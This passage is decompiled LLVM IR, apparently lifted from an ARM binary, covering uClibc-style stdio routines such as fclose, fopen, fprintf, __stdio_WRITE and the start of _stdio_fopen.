dec_label_pc_19058:                               ; preds = %dec_label_pc_19048, %.dec_label_pc_19058_crit_edge, %.thread14.thread
  %v0_19058 = phi i32 [ %v0_19058.pre, %.dec_label_pc_19058_crit_edge ], [ %v2_1903c28, %.thread14.thread ], [ %v2_19048, %dec_label_pc_19048 ]
  %v1_19058 = load i32, i32* @sp, align 4
  %v9_19058 = icmp eq i32 %v0_19058, %v1_19058
  store i1 %v9_19058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19058, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_19058
  %v1_1905c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1905c, i32* %v1_19004, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_19058, %bb43
  %v0_19060 = load i32, i32* %r0.global-to-local, align 4
  %v1_19060 = load i32, i32* %r5.global-to-local, align 4
  %v2_19060 = sub i32 %v1_19060, %v0_19060
  store i32 %v2_19060, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19064

dec_label_pc_19064:                               ; preds = %dec_label_pc_19024, %bb44
  %v0_19064 = phi i32 [ %v0_19064.pre, %dec_label_pc_19024 ], [ %v2_19060, %bb44 ]
  store i32 %v0_19064, i32* %r0.global-to-local, align 4
  %v2_1906c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1906c, i32* %r4.global-to-local, align 4
  ret i32 %v0_19064

; uselistorder directives
  uselistorder i32 %v0_19064, { 1, 0 }
  uselistorder i32 %v1_1904c, { 1, 0 }
  uselistorder i32 %v2_19048, { 0, 2, 1 }
  uselistorder i32 %v1_19018, { 1, 0 }
  uselistorder i32 %v2_19010, { 2, 0, 1, 3 }
  uselistorder i32 %v2_1903c28, { 1, 0 }
  uselistorder i32 %v2_18fd01, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 5, 3, 4, 6, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 4, 1, 2, 3, 8, 5, 9, 6, 7 }
  uselistorder i32 127, { 6, 0, 4, 1, 3, 5, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_19064, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_19058, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19010, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @__GI_fclose(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_19070 = load i32, i32* @r4, align 4
  store i32 %v3_19070, i32* %stack_var_-32, align 4
  %v6_19070 = load i32, i32* @r5, align 4
  %v9_19070 = load i32, i32* @r6, align 4
  %v12_19070 = load i32, i32* @r7, align 4
  %v2_19074 = add i32 %tmp, 52
  %v3_19074 = inttoptr i32 %v2_19074 to i32*
  %v4_19074 = load i32, i32* %v3_19074, align 4
  store i32 %v4_19074, i32* %r3.global-to-local, align 4
  %v1_19078 = sub i32 1, %v4_19074
  store i32 %v1_19078, i32* %r8.global-to-local, align 4
  %v2_19078 = icmp ult i32 %v4_19074, 2
  %v6_19078 = icmp eq i32 %v4_19074, 1
  store i1 %v6_19078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19078, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %v0_19080 = phi i32 [ 0, %bb ], [ %v1_19078, %entry ]
  %v2_19080 = icmp eq i32 %v0_19080, 0
  store i1 %v2_19080, i1* %cpsr_z.global-to-local, align 1
  %v2_19084 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %tmp, i32* @r5, align 4
  br i1 %v2_19080, label %dec_label_pc_190bc, label %dec_label_pc_19090

dec_label_pc_19090:                               ; preds = %thread-pre-split
  %v2_19090 = add i32 %tmp, 56
  store i32 %v2_19090, i32* @r4, align 4
  store i32 98440, i32* %r3.global-to-local, align 4
  %v2_19098 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_19098, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 %v2_19090, i32* @r2, align 4
  %v1_190a8 = call i32 @_pthread_cleanup_push_defer()
  %v0_190ac = load i32, i32* @r4, align 4
  store i32 %v0_190ac, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* %r3.global-to-local, align 4
  %v2_190b8 = call i32 @__pthread_return_0(i32 %v0_190ac)
  store i32 %v2_190b8, i32* %r0.global-to-local, align 4
  %v0_190bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_190bc

dec_label_pc_190bc:                               ; preds = %thread-pre-split, %dec_label_pc_19090
  %v1_190c4 = phi i32 [ %tmp, %thread-pre-split ], [ %v0_190bc.pre, %dec_label_pc_19090 ]
  %v1_190bc = add i32 %v1_190c4, 1
  %v2_190bc = inttoptr i32 %v1_190bc to i8*
  %v3_190bc = load i8, i8* %v2_190bc, align 1
  %v4_190bc = zext i8 %v3_190bc to i32
  store i32 %v4_190bc, i32* %r3.global-to-local, align 4
  %v1_190c0 = and i32 %v4_190bc, 64
  store i32 %v1_190c0, i32* %r0.global-to-local, align 4
  %v2_190c0 = icmp eq i32 %v1_190c0, 0
  store i1 %v2_190c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_190c0, label %bb19, label %bb18

bb18:                                             ; preds = %dec_label_pc_190bc
  store i32 %v1_190c4, i32* %r0.global-to-local, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_190bc, %bb18
  %v1_190c8 = xor i1 %v2_190c0, true
  call void @__pseudo_cond_branch(i1 %v1_190c8, i32 ptrtoint (i32* @global_var_1a468.1613 to i32))
  %v0_190cc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_190cc, i32* @r7, align 4
  %v0_190d0 = load i32, i32* @r5, align 4
  %v1_190d0 = add i32 %v0_190d0, 4
  %v2_190d0 = inttoptr i32 %v1_190d0 to i32*
  %v3_190d0 = load i32, i32* %v2_190d0, align 4
  store i32 %v3_190d0, i32* %r0.global-to-local, align 4
  %v1_190d4 = call i32 @__GI_close(i32 %v3_190d0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_190dc = icmp slt i32 %v1_190d4, 0
  %v2_190dc = icmp eq i32 %v1_190d4, 0
  store i1 %v2_190dc, i1* %cpsr_z.global-to-local, align 1
  %v1_190e0 = load i32, i32* @r5, align 4
  %v2_190e0 = add i32 %v1_190e0, 4
  %v3_190e0 = inttoptr i32 %v2_190e0 to i32*
  store i32 -1, i32* %v3_190e0, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2e220.1325 to i32), i32* @r2, align 4
  store i32 %v2_19084, i32* @r0, align 4
  br i1 %v1_190dc, label %bb20, label %bb21

bb20:                                             ; preds = %bb19
  %v3_190f4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_190f4, i32* @r7, align 4
  br label %bb21

bb21:                                             ; preds = %bb19, %bb20
  %v1_19100 = call i32 @_pthread_cleanup_push_defer()
  store i32 ptrtoint (i32* @global_var_2e220.1325 to i32), i32* %r0.global-to-local, align 4
  %v2_1910c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_2e220.1325 to i32))
  %v2_19114 = load i32, i32* @global_var_32478.1616, align 4
  %v1_19118 = add i32 %v2_19114, 1
  store i32 %v1_19118, i32* %r3.global-to-local, align 4
  store i32 %v1_19118, i32* @global_var_32478.1616, align 4
  store i32 %v2_19084, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v1_19130 = call i32 @_pthread_cleanup_pop_restore()
  store i32 %v1_19130, i32* %r0.global-to-local, align 4
  %v0_19134 = load i32, i32* @r5, align 4
  %v1_19134 = inttoptr i32 %v0_19134 to i32*
  %v2_19134 = load i32, i32* %v1_19134, align 4
  %v3_19138 = udiv i32 %v2_19134, 65536
  %v1_1913c = and i32 %v3_19138, 24576
  %v1_19140 = or i32 %v1_1913c, 48
  store i32 %v1_19140, i32* %r3.global-to-local, align 4
  %v3_191441 = udiv i32 %v1_1913c, 256
  %v0_19148 = load i32, i32* %r8.global-to-local, align 4
  %v2_19148 = icmp eq i32 %v0_19148, 0
  store i1 %v2_19148, i1* %cpsr_z.global-to-local, align 1
  %v1_19150 = trunc i32 %v3_191441 to i8
  %v3_19150 = inttoptr i32 %v0_19134 to i8*
  store i8 %v1_19150, i8* %v3_19150, align 1
  %v0_19154 = load i32, i32* %r3.global-to-local, align 4
  %v1_19154 = trunc i32 %v0_19154 to i8
  %v2_19154 = load i32, i32* @r5, align 4
  %v3_19154 = add i32 %v2_19154, 1
  %v4_19154 = inttoptr i32 %v3_19154 to i8*
  store i8 %v1_19154, i8* %v4_19154, align 1
  %v0_19158 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19158, label %.thread5, label %bb22

bb22:                                             ; preds = %bb21
  %v3_19158 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v3_19158, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v2_19164 = call i32 @_pthread_cleanup_pop_restore()
  store i32 %v2_19164, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb21, %bb22
  %v0_19168 = load i32, i32* @r5, align 4
  %v1_19168 = inttoptr i32 %v0_19168 to i8*
  %v2_19168 = load i8, i8* %v1_19168, align 1
  %v3_19168 = zext i8 %v2_19168 to i32
  store i32 %v3_19168, i32* %r3.global-to-local, align 4
  %v1_1916c = and i32 %v3_19168, 64
  %v2_1916c = icmp eq i32 %v1_1916c, 0
  store i1 %v2_1916c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1916c, label %bb24, label %bb23

bb23:                                             ; preds = %.thread5
  %v2_19170 = add i32 %v0_19168, 8
  %v3_19170 = inttoptr i32 %v2_19170 to i32*
  %v4_19170 = load i32, i32* %v3_19170, align 4
  store i32 %v4_19170, i32* %r0.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.thread5, %bb23
  %v1_19174 = xor i1 %v2_1916c, true
  call void @__pseudo_cond_branch(i1 %v1_19174, i32 ptrtoint (i32* @global_var_16dac.1607 to i32))
  store i32 ptrtoint (i32* @global_var_2e220.1325 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 %v2_19084, i32* @r0, align 4
  %v1_19188 = call i32 @_pthread_cleanup_push_defer()
  store i32 ptrtoint (i32* @global_var_2e220.1325 to i32), i32* %r0.global-to-local, align 4
  %v2_19194 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_2e220.1325 to i32))
  %v2_1919c = load i32, i32* @global_var_3247c.1619, align 4
  %v1_191a0 = add i32 %v2_1919c, 1
  store i32 %v1_191a0, i32* %r3.global-to-local, align 4
  store i32 %v2_19084, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_191a0, i32* @global_var_3247c.1619, align 4
  %v1_191b4 = call i32 @_pthread_cleanup_pop_restore()
  store i32 %v1_191b4, i32* %r0.global-to-local, align 4
  %v1_191b8 = call i32 @_stdio_openlist_dec_use(i32 %v1_191b4)
  %v0_191bc = load i32, i32* @r7, align 4
  store i32 %v0_191bc, i32* %r0.global-to-local, align 4
  %v2_191c4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_191c4, i32* @r4, align 4
  store i32 %v6_19070, i32* @r5, align 4
  store i32 %v9_19070, i32* @r6, align 4
  store i32 %v12_19070, i32* @r7, align 4
  ret i32 %v0_191bc

; uselistorder directives
  uselistorder i32 %v4_19074, { 2, 1, 0, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 1, 6, 7, 4, 3, 8, 9, 11, 10, 12, 2, 13, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_190bc, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_191ec = call i32 @_stdio_fopen()
  ret i32 %v0_191ec
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_191fc = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_191fc, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1920c = call i32 @__GI_vfprintf()
  ret i32 %v0_1920c

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__stdio_WRITE(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_192383 = icmp eq i32 %arg3, 0
  store i1 %v2_192383, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_192383, label %dec_label_pc_192d4, label %dec_label_pc_19240

dec_label_pc_19238thread-pre-split:               ; preds = %dec_label_pc_19240
  %v3_19258 = load i32, i32* %r6.global-to-local, align 4
  %v5_19258 = add i32 %v3_19258, %v4_19250
  store i32 %v5_19258, i32* %r6.global-to-local, align 4
  %v4_1925c = load i32, i32* %r5.global-to-local, align 4
  %v5_1925c = sub i32 %v4_1925c, %v4_19250
  store i32 %v5_1925c, i32* %r5.global-to-local, align 4
  %v2_19238 = icmp eq i32 %v5_1925c, 0
  store i1 %v2_19238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19238, label %dec_label_pc_19238.dec_label_pc_192d4.loopexit_crit_edge, label %dec_label_pc_19238thread-pre-split.dec_label_pc_19240_crit_edge

dec_label_pc_19238thread-pre-split.dec_label_pc_19240_crit_edge: ; preds = %dec_label_pc_19238thread-pre-split
  %v3_19240.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1924c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19240

dec_label_pc_19240:                               ; preds = %entry, %dec_label_pc_19238thread-pre-split.dec_label_pc_19240_crit_edge
  %v0_1924c = phi i32 [ %v0_1924c.pre, %dec_label_pc_19238thread-pre-split.dec_label_pc_19240_crit_edge ], [ %tmp, %entry ]
  %v0_19248 = phi i32 [ %v5_19258, %dec_label_pc_19238thread-pre-split.dec_label_pc_19240_crit_edge ], [ %arg2, %entry ]
  %v3_19240 = phi i32 [ %v3_19240.pre, %dec_label_pc_19238thread-pre-split.dec_label_pc_19240_crit_edge ], [ 2147483647, %entry ]
  %v0_19244.in = phi i32 [ %v5_1925c, %dec_label_pc_19238thread-pre-split.dec_label_pc_19240_crit_edge ], [ %arg3, %entry ]
  %v3_19244 = phi i32 [ %v5_1925c, %dec_label_pc_19238thread-pre-split.dec_label_pc_19240_crit_edge ], [ %arg3, %entry ]
  %v0_19244 = icmp slt i32 %v0_19244.in, 0
  %storemerge = select i1 %v0_19244, i32 %v3_19240, i32 %v3_19244
  store i32 %storemerge, i32* @r2, align 4
  %v1_1924c = add i32 %v0_1924c, 4
  %v2_1924c = inttoptr i32 %v1_1924c to i32*
  %v3_1924c = load i32, i32* %v2_1924c, align 4
  store i32 %v3_1924c, i32* %r0.global-to-local, align 4
  %tmp24 = inttoptr i32 %v0_19248 to i32*
  %v4_19250 = call i32 @__GI_write(i32 %v3_1924c, i32* %tmp24)
  store i32 %v4_19250, i32* %r0.global-to-local, align 4
  %v1_19254 = icmp slt i32 %v4_19250, 0
  %v2_19254 = icmp eq i32 %v4_19250, 0
  store i1 %v2_19254, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_19254, label %dec_label_pc_19264, label %dec_label_pc_19238thread-pre-split

dec_label_pc_19264:                               ; preds = %dec_label_pc_19240
  %v0_19264 = load i32, i32* @r4, align 4
  %v1_19264 = inttoptr i32 %v0_19264 to i32*
  %v2_19264 = load i32, i32* %v1_19264, align 4
  store i32 %v2_19264, i32* %r3.global-to-local, align 4
  %v1_19268 = add i32 %v0_19264, 8
  %v2_19268 = inttoptr i32 %v1_19268 to i32*
  %v3_19268 = load i32, i32* %v2_19268, align 4
  store i32 %v3_19268, i32* %r0.global-to-local, align 4
  %v3_1926c = udiv i32 %v2_19264, 65536
  store i32 %v3_1926c, i32* %r3.global-to-local, align 4
  %v1_19270 = add i32 %v0_19264, 12
  %v2_19270 = inttoptr i32 %v1_19270 to i32*
  %v3_19270 = load i32, i32* %v2_19270, align 4
  %v1_19274 = or i32 %v3_1926c, 8
  store i32 %v1_19274, i32* %r3.global-to-local, align 4
  %v3_192781 = udiv i32 %v2_19264, 16777216
  %v2_1927c = sub i32 %v3_19270, %v3_19268
  store i32 %v2_1927c, i32* %r2.global-to-local, align 4
  %v9_1927c = icmp eq i32 %v3_19270, %v3_19268
  store i1 %v9_1927c, i1* %cpsr_z.global-to-local, align 1
  %v1_19280 = trunc i32 %v3_192781 to i8
  %v3_19280 = inttoptr i32 %v0_19264 to i8*
  store i8 %v1_19280, i8* %v3_19280, align 1
  %v0_19284 = load i32, i32* %r3.global-to-local, align 4
  %v1_19284 = trunc i32 %v0_19284 to i8
  %v2_19284 = load i32, i32* @r4, align 4
  %v3_19284 = add i32 %v2_19284, 1
  %v4_19284 = inttoptr i32 %v3_19284 to i8*
  store i8 %v1_19284, i8* %v4_19284, align 1
  %v0_19288 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19288, label %dec_label_pc_19264.dec_label_pc_192d0_crit_edge, label %dec_label_pc_1928c

dec_label_pc_19264.dec_label_pc_192d0_crit_edge:  ; preds = %dec_label_pc_19264
  %v0_192d0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_192d0

dec_label_pc_1928c:                               ; preds = %dec_label_pc_19264
  %v0_1928c = load i32, i32* %r2.global-to-local, align 4
  %v1_1928c = load i32, i32* %r5.global-to-local, align 4
  %v3_1928c = icmp ult i32 %v0_1928c, %v1_1928c
  %v9_1928c = icmp eq i32 %v0_1928c, %v1_1928c
  store i1 %v9_1928c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1928c, label %.preheader, label %bb25

bb25:                                             ; preds = %dec_label_pc_1928c
  store i32 %v1_1928c, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_1928c, %bb25
  %v2_192a0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb26

bb26:                                             ; preds = %.preheader, %dec_label_pc_192b4
  %v2_192a0 = phi i32 [ %v2_192a0.pre, %.preheader ], [ %v1_192b8, %dec_label_pc_192b4 ]
  %v0_19294 = load i32, i32* %r6.global-to-local, align 4
  %v1_19294 = inttoptr i32 %v0_19294 to i8*
  %v2_19294 = load i8, i8* %v1_19294, align 1
  %v3_19294 = zext i8 %v2_19294 to i32
  store i32 %v3_19294, i32* %r3.global-to-local, align 4
  %v7_19298 = icmp eq i8 %v2_19294, 10
  store i1 %v7_19298, i1* %cpsr_z.global-to-local, align 1
  %v1_1929c = add i32 %v0_19294, 1
  store i32 %v1_1929c, i32* %r6.global-to-local, align 4
  %v3_192a0 = inttoptr i32 %v2_192a0 to i8*
  store i8 %v2_19294, i8* %v3_192a0, align 1
  %v0_192a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_192a4, label %dec_label_pc_192a8, label %dec_label_pc_192b4

dec_label_pc_192a8:                               ; preds = %bb26
  %v0_192a8 = load i32, i32* @r4, align 4
  %v1_192a8 = inttoptr i32 %v0_192a8 to i8*
  %v2_192a8 = load i8, i8* %v1_192a8, align 1
  %v3_192a8 = zext i8 %v2_192a8 to i32
  store i32 %v3_192a8, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v2_192a8, 2
  %v2_192ac = icmp eq i8 %tmp30, 0
  store i1 %v2_192ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_192ac, label %dec_label_pc_192b4, label %dec_label_pc_192a8.dec_label_pc_192c0_crit_edge

dec_label_pc_192a8.dec_label_pc_192c0_crit_edge:  ; preds = %dec_label_pc_192a8
  %v0_192c4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_192c0

dec_label_pc_192b4:                               ; preds = %dec_label_pc_192a8, %bb26
  %v0_192b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_192b4 = add i32 %v0_192b4, -1
  store i32 %v1_192b4, i32* %r2.global-to-local, align 4
  %v7_192b4 = icmp eq i32 %v0_192b4, 1
  store i1 %v7_192b4, i1* %cpsr_z.global-to-local, align 1
  %v0_192b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_192b8 = add i32 %v0_192b8, 1
  store i32 %v1_192b8, i32* %r0.global-to-local, align 4
  br i1 %v7_192b4, label %dec_label_pc_192b4.dec_label_pc_192c0_crit_edge, label %bb26

dec_label_pc_192b4.dec_label_pc_192c0_crit_edge:  ; preds = %dec_label_pc_192b4
  %v0_192c0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_192c0

dec_label_pc_192c0:                               ; preds = %dec_label_pc_192a8.dec_label_pc_192c0_crit_edge, %dec_label_pc_192b4.dec_label_pc_192c0_crit_edge
  %v0_192c4 = phi i32 [ %v1_192b8, %dec_label_pc_192b4.dec_label_pc_192c0_crit_edge ], [ %v0_192c4.pre, %dec_label_pc_192a8.dec_label_pc_192c0_crit_edge ]
  %v0_192c0 = phi i32 [ %v0_192c0.pre, %dec_label_pc_192b4.dec_label_pc_192c0_crit_edge ], [ %v0_192a8, %dec_label_pc_192a8.dec_label_pc_192c0_crit_edge ]
  %v1_192c0 = add i32 %v0_192c0, 8
  %v2_192c0 = inttoptr i32 %v1_192c0 to i32*
  %v3_192c0 = load i32, i32* %v2_192c0, align 4
  store i32 %v3_192c0, i32* %r3.global-to-local, align 4
  %v2_192c4 = add i32 %v0_192c0, 16
  %v3_192c4 = inttoptr i32 %v2_192c4 to i32*
  store i32 %v0_192c4, i32* %v3_192c4, align 4
  %v0_192c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_192c8 = load i32, i32* %r0.global-to-local, align 4
  %v2_192c8 = sub i32 %v1_192c8, %v0_192c8
  store i32 %v2_192c8, i32* %r3.global-to-local, align 4
  %v1_192cc = load i32, i32* %r5.global-to-local, align 4
  %v2_192cc = sub i32 %v1_192cc, %v2_192c8
  store i32 %v2_192cc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_192d0

dec_label_pc_192d0:                               ; preds = %dec_label_pc_19264.dec_label_pc_192d0_crit_edge, %dec_label_pc_192c0
  %v0_192d0 = phi i32 [ %v0_192d0.pre, %dec_label_pc_19264.dec_label_pc_192d0_crit_edge ], [ %v2_192cc, %dec_label_pc_192c0 ]
  %v1_192d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_192d0 = sub i32 %v1_192d0, %v0_192d0
  store i32 %v2_192d0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_192d4

dec_label_pc_19238.dec_label_pc_192d4.loopexit_crit_edge: ; preds = %dec_label_pc_19238thread-pre-split
  %v0_192d4.pre.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_192d4

dec_label_pc_192d4:                               ; preds = %entry, %dec_label_pc_19238.dec_label_pc_192d4.loopexit_crit_edge, %dec_label_pc_192d0
  %v0_192d4 = phi i32 [ %v2_192d0, %dec_label_pc_192d0 ], [ %v0_192d4.pre.pre, %dec_label_pc_19238.dec_label_pc_192d4.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_192d4, i32* %r0.global-to-local, align 4
  ret i32 %v0_192d4

; uselistorder directives
  uselistorder i32 %v0_192d4, { 1, 0 }
  uselistorder i32 %v0_192c0, { 1, 0 }
  uselistorder i32 %v1_192b8, { 0, 2, 1 }
  uselistorder i32 %v0_192b4, { 1, 0 }
  uselistorder i1 %v2_192ac, { 1, 0 }
  uselistorder i32 %v1_1928c, { 0, 2, 1 }
  uselistorder i32 %v0_1928c, { 1, 0 }
  uselistorder i32 %v3_19270, { 1, 0 }
  uselistorder i32 %v3_1926c, { 1, 0 }
  uselistorder i32 %v3_19268, { 1, 0, 2 }
  uselistorder i32 %v4_19250, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_1925c, { 2, 0, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 1, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 2, 6, 4, 3, 7, 9, 8, 0 }
  uselistorder i32 (i32, i32*)* @__GI_write, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_192d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_192d0, { 1, 0 }
  uselistorder label %dec_label_pc_192c0, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19240, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_192dc = load i32, i32* @r4, align 4
  store i32 %v3_192dc, i32* %stack_var_-24, align 4
  %v6_192dc = load i32, i32* @r5, align 4
  %v9_192dc = load i32, i32* @r6, align 4
  %v15_192dc = load i32, i32* @r8, align 4
  %v0_192e0 = load i32, i32* @r1, align 4
  %v1_192e0 = inttoptr i32 %v0_192e0 to i8*
  %v2_192e0 = load i8, i8* %v1_192e0, align 1
  %v3_192e0 = zext i8 %v2_192e0 to i32
  store i32 %v3_192e0, i32* @ip, align 4
  %v7_192e4 = icmp eq i8 %v2_192e0, 114
  store i1 %v7_192e4, i1* %cpsr_z.global-to-local, align 1
  %v2_192e8 = ptrtoint i32* %stack_var_-56 to i32
  %v0_192ec = load i32, i32* @r0, align 4
  store i32 %v0_192ec, i32* @r6, align 4
  %v0_192f0 = load i32, i32* @r2, align 4
  store i32 %v0_192f0, i32* @r8, align 4
  %v0_192f4 = load i32, i32* @r3, align 4
  store i32 %v0_192f4, i32* @r5, align 4
  br i1 %v7_192e4, label %dec_label_pc_19340, label %dec_label_pc_192fc

dec_label_pc_192fc:                               ; preds = %entry
  %v7_192fc = icmp eq i8 %v2_192e0, 119
  store i1 %v7_192fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_192fc, label %bb, label %dec_label_pc_19308

bb:                                               ; preds = %dec_label_pc_192fc
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_19344

dec_label_pc_19308:                               ; preds = %dec_label_pc_192fc
  %v7_19308 = icmp eq i8 %v2_192e0, 97
  store i1 %v7_19308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19308, label %bb32, label %dec_label_pc_19314

bb32:                                             ; preds = %dec_label_pc_19308
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_19344

dec_label_pc_19314:                               ; preds = %dec_label_pc_19308, %dec_label_pc_193cc, %dec_label_pc_193a0
  %v0_19314 = call i32 @__GI___errno_location()
  store i32 %v0_19314, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_1931c = load i32, i32* @r8, align 4
  %v2_1931c = icmp eq i32 %v0_1931c, 0
  store i1 %v2_1931c, i1* %cpsr_z.global-to-local, align 1
  %v2_19320 = inttoptr i32 %v0_19314 to i32*
  store i32 22, i32* %v2_19320, align 4
  br i1 %v2_1931c, label %dec_label_pc_19594, label %dec_label_pc_19328

dec_label_pc_19328:                               ; preds = %dec_label_pc_193f0._crit_edge, %dec_label_pc_19314
  %v0_19328 = load i32, i32* @r8, align 4
  %v1_19328 = inttoptr i32 %v0_19328 to i8*
  %v2_19328 = load i8, i8* %v1_19328, align 1
